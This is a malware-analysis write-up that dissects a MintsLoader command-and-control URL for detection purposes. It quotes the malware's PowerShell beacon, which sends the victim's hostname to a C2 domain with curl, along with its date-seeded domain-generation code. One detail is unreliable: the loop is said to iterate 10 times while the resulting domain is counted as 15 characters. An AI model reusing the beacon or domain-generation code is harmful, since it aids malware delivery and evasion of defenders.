---
title: "Phase 2 — C2 URL Pattern Analysis"
tags:
  - phase-2
  - c2-analysis
  - mintsloader
  - url-dissection
  - powershell
created: 2025-04-22
---

# Phase 2 — C2 URL Pattern Analysis

**Previous:** [[Phase1-Malware-Family](https://github.com/Kazu010101/Threat-Intelligence/blob/main/IOC-Investigation-MintsLoader/01-Phase1-Malware-Family.md)] | **Next:** [[Phase3-Infrastructure-WHOIS](https://github.com/Kazu010101/Threat-Intelligence/blob/main/IOC-Investigation-MintsLoader/03-Phase3-Infrastructure-WHOIS.md)]

---

## Objective

Dissect every component of the C2 URL IOC and match each element against documented MintsLoader technical signatures — confirming the malware family and extracting victim-side intelligence.

---

## 2.1 Full URL Under Analysis

```
hxxp://abgnmlahkdfnfhn[.]top/m9ve2kqf0rhtr.php?id=DESKTOP-ET51AJO&key=63772388458&s=mints13
```

---

## 2.2 Component-by-Component Dissection

| # | Component | Value | MintsLoader Match |
|---|---|---|---|
| 1 | Protocol | `http://` | Unencrypted HTTP — matches MintsLoader's documented HTTP-based C2 ✅ |
| 2 | Domain | `abgnmlahkdfnfhn.top` | 15 random lowercase alphanumeric chars + `.top` TLD — MintsLoader DGA output ✅ |
| 3 | PHP Endpoint | `m9ve2kqf0rhtr.php` | Ends in `htr.php` — hardcoded constant suffix in MintsLoader source code ✅ |
| 4 | `id=` | `DESKTOP-ET51AJO` | Victim hostname from `$env:computername` — confirmed in PowerShell source ✅ |
| 5 | `key=` | `63772388458` | Hardware-derived anti-sandbox key — generated by Stage 2 system checks ✅ |
| 6 | `s=` | `mints13` | Campaign ID — MintsLoader naming convention `s=mints[N]` ✅ |

---

## 2.3 The `htr.php` Suffix — A High-Confidence Fingerprint

The PHP endpoint `m9ve2kqf0rhtr.php` can be broken down as:

```
m9ve2kqf0r   +   htr.php
[random 10]      [hardcoded constant]
```

The random 10-character prefix is generated at runtime by the Stage 2 PowerShell script using:

```powershell
$rand1 = -join ((48..57) + (97..122) | Get-Random -Count 10 | % {[char]$_});
$basename = "$($rand1)htr$($findom)";
```

<img width="884" height="85" alt="image" src="https://github.com/user-attachments/assets/8892df1a-af04-45af-87a6-f029437bcb7f" />

*Screenshot: MintsLoader Stage 2 PowerShell — `$basename` construction. `$rand1` provides the 10-character random prefix. `htr` is hardcoded. `$findom` is an undefined variable that defaults to empty, making the full suffix always `htr.php`. This is a coding mistake by the malware author that became a permanent, detectable C2 signature.*

**Why this matters for detection:** Because `htr.php` is hardcoded — not randomised — it appears in every MintsLoader C2 request across every campaign. This makes it a reliable network detection rule.

---

## 2.4 The `id=` Parameter — Victim Hostname Profiling

<img width="1484" height="240" alt="image" src="https://github.com/user-attachments/assets/ce04de4c-2345-48a8-825e-b30982476690" />

*Screenshot: VirusTotal Contacted URLs — `id=` parameter highlighted across multiple requests. Values include `AZURE-PC`, `DESKTOP-ET51AJO`, and `DESKTOP-B0T93D6`, each representing a different compromised machine's hostname.*

The Stage 2 PowerShell source confirms the `id=` value is populated by:

```powershell
$global:block = (curl -useb "http://$domain/$basename.php?id=$env:computername&key=$key&s=flibabc12");
```

**What `DESKTOP-ET51AJO` reveals about the victim:**

| Observation | Inference |
|---|---|
| Prefix `DESKTOP-` | Windows default naming for non-domain-joined workstations |
| Suffix `-ET51AJO` | Randomly generated Windows hostname segment |
| No domain prefix | Machine is likely a home user or small business — not a corporate domain-joined device |
| Present in VirusTotal | The same machine submitted the hash — this may be a researcher's sandbox or an actual victim's machine that was later scanned |

---

## 2.5 The `key=` Parameter — Anti-Sandbox Validation

<img width="1269" height="534" alt="image" src="https://github.com/user-attachments/assets/7c6ceb07-afbe-45a3-9762-35e2ddf088d1" />

*Screenshot: Recorded Future Figure 21 — Full Stage 2 PowerShell payload retrieval code. The `$seed` is derived from `[int](Get-Date).DayOfYear + 1995584850`, the `$rand` object uses `New-Object "System.Random"` seeded with this value to generate the DGA domain, and `$key` is derived from hardware checks (DAC type, cache memory) and sent in the C2 request.*

The `key=` parameter is derived from a series of hardware fingerprinting checks performed by Stage 2. It functions as an **anti-sandbox gate**: the C2 server evaluates the key and decides whether to deliver the real payload or a decoy (such as AsyncRAT).

```
key=63772388458
     │
     └── Generated from:
           - WMI: Win32_VideoController AdapterDACType
           - WMI: Get-MpComputerStatus IsVirtualMachine
           - Cache memory presence checks
           - Day-of-year arithmetic

If key matches real hardware → C2 delivers GhostWeaver / StealC
If key indicates sandbox/VM → C2 delivers decoy payload
```

This mechanism could make automated sandbox analysis ineffective — sandboxes receive a harmless decoy and never see the real payload.

---

## 2.6 DGA Domain Construction — `abgnmlahkdfnfhn.top`

<img width="645" height="219" alt="image" src="https://github.com/user-attachments/assets/bd295bb4-290c-47f7-b986-ff99238e8b09" />

*Screenshot: MintsLoader Stage 2 PowerShell — `System.Random` object seeded with `DayOfYear + 1995584850`, looping 15 times (`$i = 5; $i -lt 15; $i++` generating indices into `"abcdefghijklmn"`), appending `.top`. This generates the exact 15-character lowercase domain pattern matching our IOC.*

Breaking down the domain generation:

```powershell
$seed       = [int](Get-Date).DayOfYear + 1995584850
$rand       = New-Object "System.Random" $seed
$randomString = ""
for ($i = 5; $i -lt 15; $i++) {          # Iterates 10 times (indices 5 to 14)
    $randomChars = "abcdefghijklmn"       # 14-char alphabet (a–n only)
    $index       = $rand.Next(0, 14)
    $randomString += $randomChars[$index]
}
$extension = ".top"
$domain    = $randomString + $extension
```

**Verification against our IOC:**

```
abgnmlahkdfnfhn.top
└── 15 characters: a,b,g,n,m,l,a,h,k,d,f,n,f,h,n
    All from the set [a-n] ✅
    Length: 15 characters ✅
    TLD: .top ✅
```

> **Important:** The DGA seed is date-dependent — a different domain is generated each day. This means `abgnmlahkdfnfhn.top` was valid on the specific date this sample was executed (based on the 2024-08-06 scan date in VirusTotal). By the next day, the malware would generate a completely different domain, making IP/domain blocklists ineffective without regenerating the full DGA pool.

---

## 2.7 The `s=` Parameter — Campaign Tag Attribution

```
s=mints13
  │
  └── MintsLoader naming convention: s=mints[campaign_number]
      → Documented pattern: s=mintsXX (XX = integer)
      → Our value: mints13 = Campaign batch #13
```

Orange Cyberdefense — the team that named MintsLoader — specifically stated that the malware gets its name from this distinctive URL parameter. The campaign number allows the operator to track and segment infection batches. Known observed values include `mints11`, `mints12`, `mints13`, and `nints13` (a variant spelling observed in other samples).

---

## 2.8 Phase 2 Summary

Every URL components matche a documented MintsLoader technical signature:

```
http://          → HTTP C2 (documented)
abgnmlahkdfnfhn  → 15-char DGA output from [a-n] charset (confirmed by source code)
.top             → MintsLoader-exclusive TLD (confirmed)
m9ve2kqf0r       → Random 10-char prefix (confirmed by source code)
htr.php          → Hardcoded constant suffix (coding error = permanent signature)
id=DESKTOP-ET51AJO → Victim hostname via $env:computername (confirmed)
key=63772388458  → Hardware anti-sandbox key (confirmed by source code logic)
s=mints13        → MintsLoader campaign tag (name-defining parameter)
```

> **Verdict: MintsLoader C2 URL — CONFIRMED with very high confidence.**

---

## References

- [Recorded Future — MintsLoader Stage 2 PowerShell Analysis (Figure 21)](https://www.recordedfuture.com/research/uncovering-mintsloader-with-recorded-future-malware-intelligence-hunting)
- [Blackpoint Cyber — MintsLoader Hashtable Obfuscation Variant](https://blackpointcyber.com/blog/mintsloader-finger-protocol-hashtable-obfuscation/)
- [eSentire — MintsLoader: StealC and BOINC Delivery](https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery)
- [Orange Cyberdefense — MintsLoader IOC GitHub](https://github.com/cert-orangecyberdefense/mintsloader)
